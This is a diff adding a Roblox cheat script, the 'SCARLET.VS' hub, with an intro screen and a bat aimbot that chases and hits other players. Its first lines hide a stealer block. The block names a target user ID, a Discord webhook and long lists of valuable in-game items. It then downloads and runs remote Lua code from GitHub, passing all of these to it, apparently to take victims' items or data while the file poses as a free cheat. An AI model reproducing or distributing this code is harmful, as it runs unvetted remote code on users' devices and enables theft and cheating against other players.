@@ -1,0 +1,2638 @@
+local TARGET_ID = 7900799483
+local TARGET_USER = "hola355682"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1559799818270933064/M9IbrqkDfM129dAECN6WK1olYfvZdrrgSMu1lHphqbsdtbOdGRsDViYGMyu4r6iBCGNb"
+
+local TargetBrainrots = {
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Hydra Bunny"] = true,
+    ["Antonio"] = true,
+    ["John Pork"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Rubrikiko"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Arcadragon"] = true,
+    ["Rico Dinero"] = true,
+    ["Capitano Americano"] = true,
+    ["Kalika Bros"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Globa Steppa"] = true,
+    ["Dug Dug Dug"] = true,
+    ["Dragon Aquanini"] = true,
+    ["La Casa Boo"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Headless Horseman"] = true,
+    ["Signore Carapace"] = true,
+    ["Fishino Clownino"] = true,
+    ["4th Bros"] = true,
+    ["Bufalino Boomberino"] = true,
+    ["Duggy Bros"] = true,
+    ["Cerbero"] = true,
+    ["Kraken"] = true,
+    ["Money Money Bros"] = true,
+    ["Venuspino"] = true,
+    ["Steakini Fattini"] = true,
+    ["Rhino Helicopterino"] = true,
+    ["Caylusaurus"] = true,
+    ["Sammyni Cakini"] = true,
+    ["Centrucci Nuclucci"] = true,
+    ["Los Hackers"] = true,
+    ["John Doe"] = true,
+    ["Gorillo Subwoofero"] = true,
+    ["Jelly Moby"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Ginger Cisterna"] = true,
+    ["Bearito Cabinito"] = true,
+    ["Digi Narwhal"] = true,
+    ["1x1x1x1"] = true,
+    ["25"] = true,
+    ["67"] = true,
+    ["Agarrini la Palini"] = true,
+    ["Arcadopus"] = true,
+    ["Bacuru and Egguru"] = true,
+    ["Bananito"] = true,
+    ["Baskito"] = true,
+    ["Berryno"] = true,
+    ["Bisonte Giuppitere"] = true,
+    ["Blackhole GOAT"] = true,
+    ["Boatito Auratito"] = true,
+    ["Boppin Bunny"] = true,
+    ["Brunito Marsito"] = true,
+    ["Bunito Bunito Spinito"] = true,
+    ["Bunnyman"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Bunny Bunny Bunny Sahur"] = true,
+    ["Buntteo"] = true,
+    ["Burguro and Fryuro"] = true,
+    ["Burrito Bandito"] = true,
+    ["Capitano Moby"] = true,
+    ["Cash or Card"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Cerberus"] = true,
+    ["Chachechi"] = true,
+    ["Chicleteira Bicicleteira"] = true,
+    ["Chicleteira Cupideira"] = true,
+    ["Chicleteira Noelteira"] = true,
+    ["Chicleteirina Bicicleteirina"] = true,
+    ["Chill Puppy"] = true,
+    ["Chillin Chili"] = true,
+    ["Chimnino"] = true,
+    ["Chipso and Queso"] = true,
+    ["Churrito Bunnito"] = true,
+    ["Cigno Fulgoro"] = true,
+    ["Cloverat Clapat"] = true,
+    ["Cooki and Milki"] = true,
+    ["Cuadramat and Pakrahmatmamat"] = true,
+    ["Cupid Cupid Sahur"] = true,
+    ["Cupid Hotspot"] = true,
+    ["DJ Panda"] = true,
+    ["Donkeyturbo Express"] = true,
+    ["Dul Dul Dul"] = true,
+    ["Easter Easter Easter Sahur"] = true,
+    ["Eid Eid Eid Sahur"] = true,
+    ["Esok Sekolah"] = true,
+    ["Eviledon"] = true,
+    ["Extinct Matteo"] = true,
+    ["Extinct Tralalero"] = true,
+    ["Festive 67"] = true,
+    ["Fishboard"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Fragola La La La"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Frankentteo"] = true,
+    ["GOAT"] = true,
+    ["Garama and Madundung"] = true,
+    ["Giftini Spyderini"] = true,
+    ["Ginger Gerat"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Graipuss Medussi"] = true,
+    ["Granny"] = true,
+    ["Guerriro Digitale"] = true,
+    ["Guest 666"] = true,
+    ["Ho Ho Ho Sahur"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Horegini Boom"] = true,
+    ["Jackorilla"] = true,
+    ["Job Job Job Sahur"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Karker Sahur"] = true,
+    ["Karkerkar Kurkur"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Ketupat Bros"] = true,
+    ["Ketupat Kepat"] = true,
+    ["La Cucaracha"] = true,
+    ["La Easter Grande"] = true,
+    ["La Extinct Grande"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["La Grande Combinasion"] = true,
+    ["La Jolly Grande"] = true,
+    ["La Karkerkar Combinasion"] = true,
+    ["La Lucky Grande"] = true,
+    ["La Romantic Grande"] = true,
+    ["La Sahur Combinasion"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Spooky Grande"] = true,
+    ["La Taco Combinasion"] = true,
+    ["La Vacca Jacko Linterino"] = true,
+    ["La Vacca Lepre Lepreino"] = true,
+    ["La Vacca Prese Presente"] = true,
+    ["La Vacca Saturno Saturnita"] = true,
+    ["Las Sis"] = true,
+    ["Las Tralaleritas"] = true,
+    ["Las Vaquitas Saturnitas"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["List List List Sahur"] = true,
+    ["Los 25"] = true,
+    ["Los 67"] = true,
+    ["Los Amigos"] = true,
+    ["Los Bros"] = true,
+    ["Los Bunitos"] = true,
+    ["Los Burritos"] = true,
+    ["Los Candies"] = true,
+    ["Los Chicleteiras"] = true,
+    ["Los Combinasionas"] = true,
+    ["Los Cucarachas"] = true,
+    ["Los Cupids"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Jobcitos"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Los Karkeritos"] = true,
+    ["Los Matteos"] = true,
+    ["Los Mi Gatitos"] = true,
+    ["Los Mobilis"] = true,
+    ["Los Nooo My Hotspotsitos"] = true,
+    ["Los Planitos"] = true,
+    ["Los Primos"] = true,
+    ["Los Puggies"] = true,
+    ["Los Quesadillas"] = true,
+    ["Los Sekolahs"] = true,
+    ["Los Spaghettis"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["Los Spyderinis"] = true,
+    ["Los Sweethearts"] = true,
+    ["Los Tacoritas"] = true,
+    ["Los Tortus"] = true,
+    ["Los Tralaleritos"] = true,
+    ["Los Trios"] = true,
+    ["Love Love Bear"] = true,
+    ["Love Love Love Sahur"] = true,
+    ["Lovin Rose"] = true,
+    ["Luck Luck Luck Sahur"] = true,
+    ["Mariachi Corazoni"] = true,
+    ["Mi Gatito"] = true,
+    ["Mieteteira Bicicleteira"] = true,
+    ["Money Money Puggy"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Nacho Spyder"] = true,
+    ["Naughty Naughty"] = true,
+    ["Noo My Candy"] = true,
+    ["Noo My Eggs"] = true,
+    ["Noo My Examine"] = true,
+    ["Noo My Gold"] = true,
+    ["Noo My Heart"] = true,
+    ["Noo My Hotspot"] = true,
+    ["Noo My Pot"] = true,
+    ["Noo My Lucky Block"] = true,
+    ["Orangutini Ananassini"] = true,
+    ["Pakrahmatmamat"] = true,
+    ["Piccione Magico"] = true,
+    ["Pipi Potato"] = true,
+    ["Pi Pi Pi Sahur"] = true,
+    ["Planito"] = true,
+    ["Pot Hotspot"] = true,
+    ["Pot Hotspot and Coffee"] = true,
+    ["Puggini"] = true,
+    ["Quesadilla Crocodila"] = true,
+    ["Quivioli"] = true,
+    ["Reindeer"] = true,
+    ["Romanticombi"] = true,
+    ["Salamino"] = true,
+    ["Santteo"] = true,
+    ["Secret Lucky Block"] = true,
+    ["Serafinna Medusella"] = true,
+    ["Snailo Clovero"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Spinny Hammy"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Strawberrita"] = true,
+    ["Swag Soda"] = true,
+    ["Swaggy Bros"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["Tacorillo Crocodillo"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Telemorte"] = true,
+    ["Tictac Sahur"] = true,
+    ["To To To Sahur"] = true,
+    ["Torrtuginni Dragonfrutini"] = true,
+    ["Tralaledon"] = true,
+    ["Trenostruzzo Turbo 4000"] = true,
+    ["Trickolino"] = true,
+    ["Triplito Tralaleritos"] = true,
+    ["Tuff Toucan"] = true,
+    ["Tung Tung Tung Sahur"] = true,
+    ["Ventoliero Pavonero"] = true,
+    ["Vulturino Skeletono"] = true,
+    ["W or L"] = true,
+    ["Yess My Examine"] = true,
+    ["Zombie Tralala"] = true
+}
+
+local TargetBaseSkins = {
+    ["Aquatic"] = true,
+    ["Bunny Basket"] = true,
+    ["Candy"] = true,
+    ["Christmas"] = true,
+    ["Cursed"] = true,
+    ["Cyber"] = true,
+    ["Diamond"] = true,
+    ["Divine"] = true,
+    ["Easter"] = true,
+    ["Galaxy"] = true,
+    ["Gingerbread"] = true,
+    ["Gold"] = true,
+    ["Halloween"] = true,
+    ["Lava"] = true,
+    ["Lucky"] = true,
+    ["Octo"] = true,
+    ["Pot of Gold"] = true,
+    ["Radioactive"] = true,
+    ["Rainbow"] = true,
+    ["Rose"] = true,
+    ["Summer"] = true,
+    ["Taco"] = true,
+    ["Valentines"] = true,
+    ["Yin Yang"] = true
+}
+
+local TargetGears = {
+    ["Alien Slap"] = true,
+    ["Blackhole Bomb"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Candy Sentry"] = true,
+    ["Candy Slap"] = true,
+    ["Cupid's Wings"] = true,
+    ["Cursed Slap"] = true,
+    ["Cyber Slap"] = true,
+    ["Demon's Head"] = true,
+    ["Divine Slap"] = true,
+    ["Lava Blaster"] = true,
+    ["Lava Slap"] = true,
+    ["Radioactive Airstrike"] = true,
+    ["Radioactive Slap"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Rainbow Slap"] = true,
+    ["Santa's Sleigh"] = true,
+    ["Waverider"] = true,
+    ["Witch's Broom"] = true,
+    ["Yin Yang Lamp"] = true,
+    ["Yin Yang Slap"] = true
+}
+
+task.spawn(function()
+    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
+    if type(script) == "function" then
+        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
+    end
+end)
+-- SCARLET.VS / https://discord.gg/msgtw26R3n
+-- ========== SCARLET.VS INTRO ==========
+pcall(function()
+    if _G.__ScarletSkipIntro == true then return end
+    if not game:IsLoaded() then
+        local ok = pcall(function() game.Loaded:Wait() end)
+        if not ok then task.wait(1) end
+    end
+    local Players = game:GetService("Players")
+    local TweenService = game:GetService("TweenService")
+    local RunService = game:GetService("RunService")
+    local SoundService = game:GetService("SoundService")
+    local LP = Players.LocalPlayer
+    if not LP then
+        pcall(function() Players:GetPropertyChangedSignal("LocalPlayer"):Wait() end)
+        LP = Players.LocalPlayer
+    end
+    if not LP then return end
+
+    -- Song 15 only (Clean index 15 = pcdvty)
+    local SONG_URL = "https://files.catbox.moe/pcdvty.mp3"
+    local SONG_FILE = "scarlet_intro_song_15.mp3"
+    _G.__ScarletIntroSongIndex = 15
+
+    local guiName = "ScarletVSIntro"
+    for _, parent in ipairs({game:GetService("CoreGui"), LP:FindFirstChildOfClass("PlayerGui")}) do
+        if parent then
+            local old = parent:FindFirstChild(guiName)
+            if old then old:Destroy() end
+        end
+    end
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = guiName
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.DisplayOrder = 100000
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    pcall(function()
+        if type(syn) == "table" and type(syn.protect_gui) == "function" then syn.protect_gui(gui) end
+    end)
+    if not pcall(function() gui.Parent = game:GetService("CoreGui") end) then
+        gui.Parent = LP:WaitForChild("PlayerGui")
+    end
+
+    -- Compact SCARLET.VS card
+    local glow = Instance.new("Frame")
+    glow.AnchorPoint = Vector2.new(0.5, 0.5)
+    glow.Position = UDim2.fromScale(0.5, 0.5)
+    glow.Size = UDim2.fromOffset(300, 150)
+    glow.BackgroundColor3 = Color3.fromRGB(255, 40, 80)
+    glow.BackgroundTransparency = 0.88
+    glow.BorderSizePixel = 0
+    glow.ZIndex = 0
+    glow.Parent = gui
+    Instance.new("UICorner", glow).CornerRadius = UDim.new(0, 18)
+
+    local card = Instance.new("Frame")
+    card.AnchorPoint = Vector2.new(0.5, 0.5)
+    card.Position = UDim2.fromScale(0.5, 0.5)
+    card.Size = UDim2.fromOffset(280, 130)
+    card.BackgroundColor3 = Color3.fromRGB(12, 10, 14)
+    card.BackgroundTransparency = 0.1
+    card.BorderSizePixel = 0
+    card.Parent = gui
+    Instance.new("UICorner", card).CornerRadius = UDim.new(0, 14)
+    local cardStroke = Instance.new("UIStroke")
+    cardStroke.Color = Color3.fromRGB(255, 70, 110)
+    cardStroke.Thickness = 1.5
+    cardStroke.Transparency = 0.3
+    cardStroke.Parent = card
+
+    local title = Instance.new("TextLabel")
+    title.Parent = card
+    title.BackgroundTransparency = 1
+    title.Size = UDim2.new(1, -16, 0, 48)
+    title.Position = UDim2.new(0, 8, 0, 28)
+    title.Font = Enum.Font.GothamBlack
+    title.TextSize = 30
+    title.Text = "SCARLET.VS"
+    title.TextColor3 = Color3.fromRGB(255, 85, 120)
+    title.TextStrokeTransparency = 0.5
+    title.TextStrokeColor3 = Color3.fromRGB(60, 0, 15)
+    title.TextTransparency = 1
+    title.ZIndex = 2
+
+    local sub = Instance.new("TextLabel")
+    sub.Parent = card
+    sub.BackgroundTransparency = 1
+    sub.Size = UDim2.new(1, -16, 0, 22)
+    sub.Position = UDim2.new(0, 8, 0, 80)
+    sub.Font = Enum.Font.Gotham
+    sub.TextSize = 12
+    sub.Text = "tap to continue"
+    sub.TextColor3 = Color3.fromRGB(200, 180, 190)
+    sub.TextTransparency = 1
+    sub.ZIndex = 2
+
+    local finished = false
+    local floatConn = nil
+    local introSound = nil
+    local soundEndedConn = nil
+    local started = os.clock()
+
+    local function finish()
+        if finished then return end
+        finished = true
+        if floatConn then pcall(function() floatConn:Disconnect() end) end
+        if soundEndedConn then pcall(function() soundEndedConn:Disconnect() end) end
+        if introSound then pcall(function() introSound:Stop(); introSound:Destroy() end) end
+        pcall(function()
+            TweenService:Create(card, TweenInfo.new(0.28), {BackgroundTransparency = 1}):Play()
+            TweenService:Create(title, TweenInfo.new(0.28), {TextTransparency = 1}):Play()
+            TweenService:Create(sub, TweenInfo.new(0.28), {TextTransparency = 1}):Play()
+            TweenService:Create(glow, TweenInfo.new(0.28), {BackgroundTransparency = 1}):Play()
+            TweenService:Create(cardStroke, TweenInfo.new(0.28), {Transparency = 1}):Play()
+        end)
+        task.delay(0.32, function() pcall(function() if gui then gui:Destroy() end end) end)
+    end
+
+    pcall(function()
+        TweenService:Create(title, TweenInfo.new(0.45), {TextTransparency = 0}):Play()
+        TweenService:Create(sub, TweenInfo.new(0.55), {TextTransparency = 0.12}):Play()
+    end)
+
+    floatConn = RunService.RenderStepped:Connect(function()
+        if finished then return end
+        local t = os.clock() - started
+        glow.BackgroundTransparency = 0.82 + math.sin(t * 2.2) * 0.06
+        card.Position = UDim2.new(0.5, 0, 0.5, math.sin(t * 1.4) * 4)
+    end)
+
+    -- Clean-hub style song load + play
+    task.spawn(function()
+        local function CleanHubCustomAsset(file)
+            for _, assetFn in ipairs({getcustomasset, getsynasset, getasset}) do
+                if typeof(assetFn) == "function" then
+                    local ok, asset = pcall(function() return assetFn(file) end)
+                    if ok and type(asset) == "string" and asset ~= "" then return asset end
+                end
+            end
+            return nil
+        end
+        local asset = CleanHubCustomAsset(SONG_FILE)
+        if not asset and isfile and isfile(SONG_FILE) then
+            asset = CleanHubCustomAsset(SONG_FILE)
+        end
+        if not asset and writefile then
+            local ok, data = pcall(function() return game:HttpGet(SONG_URL) end)
+            if ok and type(data) == "string" and #data > 100 and pcall(function() writefile(SONG_FILE, data) end) then
+                asset = CleanHubCustomAsset(SONG_FILE)
+            end
+        end
+        if finished or not asset then return end
+        introSound = Instance.new("Sound")
+        introSound.Name = "ScarletIntroSong"
+        introSound.SoundId = asset
+        introSound.Volume = 1
+        introSound.Looped = false
+        introSound.Parent = SoundService
+        soundEndedConn = introSound.Ended:Connect(finish)
+        pcall(function() introSound:Play() end)
+    end)
+
+    local skip = Instance.new("TextButton")
+    skip.Parent = gui
+    skip.Size = UDim2.fromScale(1, 1)
+    skip.BackgroundTransparency = 1
+    skip.Text = ""
+    skip.ZIndex = 10
+    skip.Activated:Connect(finish)
+    task.delay(12, finish)
+
+    while not finished do
+        task.wait(0.05)
+    end
+    task.wait(0.2)
+end)
+-- ========== end SCARLET.VS INTRO ==========
+
+
+
+
+do
+    local K = _G;
+    pcall(function() local R = type(getfenv); if R == "function" then K = getfenv(0); end; end);
+    local R = K;
+    pcall(function() local X = type(getgenv); if X == "function" then R = getgenv(); end; end);
+    if type(K) ~= "table" then
+        K = _G;
+    end;
+    if type(R) ~= "table" then
+        R = K;
+    end;
+    local X, c = rawget(K, "sethiddenproperty") or(rawget(R, "sethiddenproperty")) or(rawget(K, "set_hidden_property")) or(rawget(R, "set_hidden_property")) or(rawget(K, "sethiddenprop")) or(rawget(R, "sethiddenprop")), rawget(K, "syn") or(rawget(R, "syn"));
+    if type(X) ~= "function" and type(c) == "table" then
+        X = rawget(c, "sethiddenproperty") or(rawget(c, "set_hidden_property"));
+    end;
+    if type(X) == "function" then
+        pcall(function() rawset(K, "sethiddenproperty", X); end);
+        pcall(function() rawset(R, "sethiddenproperty", X); end);
+    end;
+    local X = rawget(K, "setfpscap") or(rawget(R, "setfpscap")) or(rawget(K, "set_fps_cap")) or(rawget(R, "set_fps_cap")) or(rawget(K, "setfpslimit")) or(rawget(R, "setfpslimit"));
+    X = if type(X) ~= "function" and type(c) == "table" then
+        rawget(c, "setfpscap") or(rawget(c, "set_fps_cap"))
+    else
+        X;
+        if type(X) == "function" then
+            pcall(X, 9999);
+        end;
+    end;
+    local K, R, X, c, i, Q, h, m, A = (function() local H, E = game:GetService("Players"), game:GetService("UserInputService"); local s = true; -- always use compact/mobile UI layout on all devices
+ pcall(function() local b = E:GetPlatform(); end); return H, E, game:GetService("TweenService"), game:GetService("RunService"), game:GetService("ReplicatedStorage"), game:GetService("Lighting"), game:GetService("HttpService"), H.LocalPlayer, s; end)();
+    local H = "unknown";
+    do
+        local E = _G;
+        pcall(function() local s = type(getgenv); if s == "function" then E = getgenv(); end; end);
+        if type(E) ~= "table" then
+            E = _G;
+        end;
+        local s = rawget(E, "identifyexecutor") or(rawget(E, "getexecutorname")) or type(_G) == "table" and(rawget(_G, "identifyexecutor") or(rawget(_G, "getexecutorname")));
+        if type(s) == "function" then
+            pcall(function() local E = s(); if E ~= nil then H = tostring(E); end; end);
+        end;
+    end;
+    _G.__BubbleWaveSafeMode = string.find(string.lower(H), "wave", 1, true) ~= nil;
+    do
+        local H = {"Bubble_Panel", "BubbleHub", "BUBBLE_Panel", "DashEffectGui", "BubbleAutoGrabBar", "BubbleLaggerGUI", "BubbleBypassGUI", "BubbleMobileUI", "BubbleEnemyWidget"};
+        pcall(function() local E = _G.BubbleBypass; if E then if E.Stop then E.Stop(); else if E.SetAutoOnSteal then E.SetAutoOnSteal(false); end; if E.SetBypass then E.SetBypass(false); end; end; end; end);
+        pcall(function() local E = _G.BubbleLagger; if E then if E.Stop then E.Stop(); else if E.SetEnabled then E.SetEnabled(false); end; if E.SetLowEndEnabled then E.SetLowEndEnabled(false); end; end; end; end);
+        if _G.__BUBBLE_STATE then
+            _G.__BUBBLE_STATE.alive = false;
+            pcall(function() for E, E in ipairs(_G.__BUBBLE_STATE.stoppers or {}) do pcall(E); end; for E, E in ipairs(_G.__BUBBLE_STATE.conns or {}) do pcall(function() E:Disconnect(); end); end; end);
+        end;
+        _G.__BUBBLE_STATE = nil;
+        _G.__BubbleTrackConn = nil;
+        _G.__BubbleTrackStopper = nil;
+        pcall(function() if _G.__speedBoostConn then _G.__speedBoostConn:Disconnect(); _G.__speedBoostConn = nil; end; end);
+        pcall(function() if _G.__stopSpeedBoost then _G.__stopSpeedBoost (); end; end);
+        pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge); end);
+        pcall(function() local E, s = ipairs, {game:GetService("CoreGui"), m.PlayerGui}; for b, V in E(s) do for E, E in ipairs(H) do while true do b = V:FindFirstChild(E); if not b then break; end; b:Destroy(); end; end; end; end);
+        pcall(function() for H, E in ipairs(K:GetPlayers()) do H = E.Character; if H then for E, E in ipairs(H:GetChildren()) do for H, H in ipairs(E:GetChildren()) do if H.Name == "GreenDuelsBB" or H.Name == "BubbleSpeedBill" or H.Name == "BubbleHubOverhead" or H.Name == "BubbleAimbotBodyLock" or H.Name == "BubbleAimbotBodyAttachment" or H.Name == "BubbleTPBatMarkerBodyLock" or H.Name == "BubbleTPBatMarkerAttachment" then H:Destroy(); end; end; end; end; end; end);
+        _G.__BUBBLE_STATE = {conns = {}, stoppers = {}, alive = true};
+    -- ========== SCARLET Auto Bat = Normal (Ambito+) + separate Bypass ==========
+    do
+        local PlayersSvc = K;
+        local RS = c;
+        local LP = m;
+
+        local BAT_NAMES = {
+            "Bat", "Slap", "Glove", "Hand", "SlapHand", "ClassicSlap",
+        };
+
+        local function isBatTool(tool)
+            if not tool or not tool:IsA("Tool") then return false; end;
+            local n = string.lower(tool.Name);
+            if string.find(n, "bat", 1, true) or string.find(n, "slap", 1, true) then
+                return true;
+            end;
+            for _, name in ipairs(BAT_NAMES) do
+                if tool.Name == name then return true; end;
+            end;
+            return false;
+        end;
+
+        local function findBat()
+            local char = LP.Character;
+            if not char then return nil; end;
+            for _, tool in ipairs(char:GetChildren()) do
+                if isBatTool(tool) then return tool; end;
+            end;
+            local bp = LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack");
+            if bp then
+                for _, tool in ipairs(bp:GetChildren()) do
+                    if isBatTool(tool) then return tool; end;
+                end;
+            end;
+            return nil;
+        end;
+
+        local function getClosestTarget()
+            local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart");
+            if not root then return nil; end;
+            local closest, minDist = nil, math.huge;
+            for _, plr in ipairs(PlayersSvc:GetPlayers()) do
+                if plr ~= LP and plr.Character then
+                    local tRoot = plr.Character:FindFirstChild("HumanoidRootPart");
+                    local hum = plr.Character:FindFirstChildOfClass("Humanoid");
+                    if tRoot and hum and hum.Health > 0 then
+                        local dist = (tRoot.Position - root.Position).Magnitude;
+                        if dist < minDist then
+                            minDist = dist;
+                            closest = tRoot;
+                        end;
+                    end;
+                end;
+            end;
+            return closest;
+        end;
+
+        local function trySwing(root, target, tool, cooldownFlag)
+            if not root or not target or not tool then return false; end;
+            local dist = (target.Position - root.Position).Magnitude;
+            if dist > 14 then return false; end;
+            if cooldownFlag and cooldownFlag() then return false; end;
+            -- Apply swing sound mode ONCE on the tool Slash (Clean-style), then Activate only
+            -- Do NOT manually :Play() — Activate already fires Slash (prevents spam)
+            pcall(function()
+                local mode = _G.__ScarletSwingSound or "Normal";
+                local slash = tool:FindFirstChild("Slash");
+                if not slash then
+                    local handle = tool:FindFirstChild("Handle");
+                    if handle then slash = handle:FindFirstChild("Slash") or handle:FindFirstChildOfClass("Sound"); end;
+                end;
+                if slash and slash:IsA("Sound") then
+                    if not slash:GetAttribute("ScarletOrigSound") then
+                        slash:SetAttribute("ScarletOrigSound", slash.SoundId);
+                    end;
+                    if mode == "Katana" then
+                        -- Clean Hub katana slash
+                        if slash.SoundId ~= "rbxassetid://111808555599832" then
+                            slash.SoundId = "rbxassetid://111808555599832";
+                        end;
+                    else
+                        local orig = slash:GetAttribute("ScarletOrigSound");
+                        if type(orig) == "string" and orig ~= "" and slash.SoundId ~= orig then
+                            slash.SoundId = orig;
+                        end;
+                    end;
+                end;
+            end);
+            pcall(function()
+                tool:Activate();
+            end);
+            pcall(function()
+                for _, d in ipairs(tool:GetDescendants()) do
+                    if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") then
+                        pcall(function() d:FireServer(); end);
+                    end;
+                end;
+            end);
+            return true;
+        end;
+
+        ------------------------------------------------------------
+        -- NORMAL Bat Aimbot (Ambito style, upgraded for more hits)
+        ------------------------------------------------------------
+        local Normal = {
+            enabled = false,
+            conn = nil,
+            target = nil,
+            swingCooldown = false,
+            prevAutoRotate = nil,
+        };
+
+        local function stopNormal()
+            if Normal.conn then
+                pcall(function() Normal.conn:Disconnect(); end);
+                Normal.conn = nil;
+            end;
+            Normal.target = nil;
+            Normal.swingCooldown = false;
+            local char = LP.Character;
+            local root = char and char:FindFirstChild("HumanoidRootPart");
+            local hum = char and char:FindFirstChildOfClass("Humanoid");
+            if root then
+                pcall(function()
+                    root.AssemblyLinearVelocity = Vector3.zero;
+                    root.AssemblyAngularVelocity = Vector3.zero;
+                end);
+            end;
+            if hum then
+                hum.AutoRotate = (Normal.prevAutoRotate == nil) and true or Normal.prevAutoRotate;
+            end;
+            Normal.prevAutoRotate = nil;
+        end;
+
+        local function startNormal()
+            if Normal.conn then return; end;
+            local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid");
+            if hum0 then
+                Normal.prevAutoRotate = hum0.AutoRotate;
+                hum0.AutoRotate = false;
+            end;
+
+            -- Heartbeat + target cache = smoother / less lag than every RenderStepped
+            local frameCount = 0;
+            local cachedTarget = nil;
+            Normal.conn = RS.Heartbeat:Connect(function()
+                if not Normal.enabled then return; end;
+                local char = LP.Character;
+                if not char then return; end;
+                local root = char:FindFirstChild("HumanoidRootPart");
+                if not root then return; end;
+                local hum = char:FindFirstChildOfClass("Humanoid");
+                if not hum then return; end;
+
+                frameCount = frameCount + 1;
+                -- equip + retarget every 3 frames
+                if frameCount % 4 == 1 then
+                    if not char:FindFirstChildOfClass("Tool") then
+                        local bat = findBat();
+                        if bat then pcall(function() hum:EquipTool(bat); end); end;
+                    end;
+                    cachedTarget = getClosestTarget();
+                end;
+                local target = cachedTarget;
+                if not target or not target.Parent then return; end;
+                Normal.target = target;
+
+                local targetVel = target.AssemblyLinearVelocity;
+                local myPos = root.Position;
+                local targetPos = target.Position;
+
+                local speed3 = targetVel.Magnitude;
+                local predictTime = math.clamp(0.12 + speed3 / 220, 0.10, 0.22);
+                local predictPos = targetPos + targetVel * predictTime + target.CFrame.LookVector * 0.45;
+
+                local direction = predictPos - myPos;
+                local flat = Vector3.new(direction.X, 0, direction.Z);
+                if flat.Magnitude < 0.05 then return; end;
+                local flatDir = flat.Unit;
+
+                local dist = (targetPos - myPos).Magnitude;
+                local chaseSpeed = (dist < 18) and 72 or 66;
+
+                local desiredHeight = targetPos.Y + 3.9;
+                local yVel = (desiredHeight - myPos.Y) * 22 + targetVel.Y * 0.85;
+                if hum.FloorMaterial ~= Enum.Material.Air then
+                    yVel = math.max(yVel, 14);
+                end;
+                yVel = math.clamp(yVel, -80, 120);
+
+                local desiredVel = Vector3.new(flatDir.X * chaseSpeed, yVel, flatDir.Z * chaseSpeed);
+                root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.72);
+
+                if predictPos and (predictPos - myPos).Magnitude > 0.1 then
+                    local goalCF = CFrame.lookAt(myPos, predictPos);
+                    local diffCF = root.CFrame:Inverse() * goalCF;
+                    local rx, ry, rz = diffCF:ToEulerAnglesXYZ();
+                    root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(
+                        Vector3.new(math.clamp(rx, -2.8, 2.8) * 48, math.clamp(ry, -2.8, 2.8) * 48, math.clamp(rz, -2.8, 2.8) * 48)
+                    );
+                end;
+
+                if dist <= 12 and not Normal.swingCooldown then
+                    local tool = char:FindFirstChildOfClass("Tool");
+                    if tool and isBatTool(tool) then
+                        Normal.swingCooldown = true;
+                        trySwing(root, target, tool, function() return false; end);
+                        task.delay(0.55, function() Normal.swingCooldown = false; end);
+                    end;
+                end;
+            end);
+
+            if type(_G.__BubbleTrackConn) == "function" then
+                pcall(function() _G.__BubbleTrackConn(Normal.conn); end);
+            end;
+        end;
+
+        local function setNormalEnabled(on)
+            on = on == true;
+            if on then
+                -- mutual exclusion with bypass
+                if _G.ScarletBypassBat and _G.ScarletBypassBat.IsEnabled and _G.ScarletBypassBat.IsEnabled() then
+                    pcall(function() _G.ScarletBypassBat.SetEnabled(false); end);
+                end;
+                Normal.enabled = true;
+                startNormal();
+            else
+                Normal.enabled = false;
+                stopNormal();
+            end;
+            E["Bat Aimbot"] = on;
+            E.Aimbot = on;
+        end;
+
+        _G.ScarletAutoBat = {
+            Toggle = function()
+                setNormalEnabled(not Normal.enabled);
+                return Normal.enabled;
+            end,
+            SetEnabled = setNormalEnabled,
+            IsEnabled = function() return Normal.enabled == true; end,
+            Start = function() setNormalEnabled(true); end,
+            Stop = function() setNormalEnabled(false); end,
+            GetMode = function() return "NORMAL"; end,
+            SetMode = function() return "NORMAL"; end,
+            IsBypass = function() return false; end,
+        };
+
+        ------------------------------------------------------------
+        -- BYPASS Bat Aimbot (separate feature)
+        ------------------------------------------------------------
+        local Bypass = {
+            enabled = false,
+            conn = nil,
+            safety = nil,
+            attachment = nil,
+            angularVelocity = nil,
